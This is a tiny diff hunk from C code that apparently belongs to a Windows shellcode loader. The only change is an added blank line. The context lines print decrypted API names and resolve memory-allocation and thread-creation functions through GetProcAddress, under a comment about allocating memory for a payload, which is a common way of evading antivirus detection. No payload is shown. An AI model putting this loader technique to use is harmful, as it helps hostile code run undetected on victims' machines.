@@ -73,6 +73,7 @@ int main(void) {
 	printf("%s\n", cipher_vProtect);
 	printf("%s\n", cipher_vAlloc);
 	printf("%s\n", cipher_cThread);
+	
 	// Allocate memory for payload
 	vAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), cipher_vAlloc);
 	cThread = GetProcAddress(GetModuleHandle("kernel32.dll"), cipher_cThread);
